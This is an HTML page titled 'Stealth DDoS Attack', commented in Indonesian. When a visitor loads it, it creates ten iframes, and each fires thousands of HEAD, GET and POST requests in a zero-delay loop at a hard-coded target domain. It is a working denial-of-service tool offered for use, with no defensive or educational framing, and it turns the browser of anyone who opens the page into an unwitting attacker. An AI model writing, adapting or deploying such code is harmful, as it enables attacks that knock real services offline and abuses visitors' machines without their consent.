<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stealth DDoS Attack</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            overflow: hidden;
            height: 100%;
            background: #f0f0f0;
        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
    <script>
        // Fungsi buat tempat iframe
        function createAttackFrame() {
            const iframe = document.createElement('iframe');
            iframe.src = 'about:blank'; // Menggunakan about:blank untuk menghindari permintaan tambahan
            iframe.style.position = 'absolute';
            iframe.style.top = '0';
            iframe.style.left = '0';
            iframe.style.width = '100%';
            iframe.style.height = '100%';
            iframe.style.border = 'none';
            iframe.style.display = 'block'; // Menyembunyikan iframe
            document.body.appendChild(iframe);

            iframe.onload = function() {
                const doc = iframe.contentDocument || iframe.contentWindow.document;
                doc.open();
                doc.write(`
                    <!DOCTYPE html>
                    <html lang="en">
                    <body>
                        <script>
                            function sendRequest(targetURL, method) {
                                const xhr = new XMLHttpRequest();
                                xhr.open(method, targetURL, true);
                                xhr.onreadystatechange = function() {
                                    if (xhr.readyState === 4) {
                                        console.log(\`\${method} \${xhr.status}: \${xhr.responseURL}\`);
                                    }
                                };
                                xhr.send();
                            }

                            function startAttack(targetURL) {
                                function attack() {
                                    ['HEAD', 'GET', 'POST'].forEach(method => sendRequest(targetURL, method));
                                }

                                // Burst awal 1000 permintaan untuk setiap metode
                                for (let i = 0; i < 1000; i++) {
                                    attack();
                                }

                                // Lakukan permintaan secara agresif
                                setInterval(attack, 0);
                            }

                            // Ganti 'https://example.com' dengan URL target
                            startAttack('https://setia.dewi11-pit.com');
                        </script>
                    </body>
                    </html>
                `);
                doc.close();
            };
        }

        // Buat beberapa iframe untuk meningkatkan agresivitas serangan
        for (let i = 0; i < 10; i++) {
            createAttackFrame();
        }
    </script>
</body>
</html>
